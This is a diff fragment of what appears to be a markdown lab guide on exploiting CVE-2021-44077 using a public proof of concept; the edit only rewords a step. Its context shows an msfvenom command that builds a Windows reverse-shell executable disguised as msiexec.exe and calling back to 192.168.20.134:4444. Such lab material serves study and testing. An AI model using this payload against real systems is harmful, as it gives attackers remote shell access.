@@ -3,7 +3,7 @@
 
 ## 1. Hands On Action: Exploiting [CVE-2021-44077](https://nvd.nist.gov/vuln/detail/CVE-2021-44077) Vulnerability based on POC in [GitHub](https://github.com/horizon3ai/CVE-2021-44077)
 
-a. in the POC msiexec.exe is created through `msfvenom`
+a. Based on the [POC](https://github.com/horizon3ai/CVE-2021-44077) msiexec.exe is created through `msfvenom`
 
 ```
 msfvenom -p windows/shell_reverse_tcp LHOST=192.168.20.134 LPORT=4444 -f exe > msiexec.exe
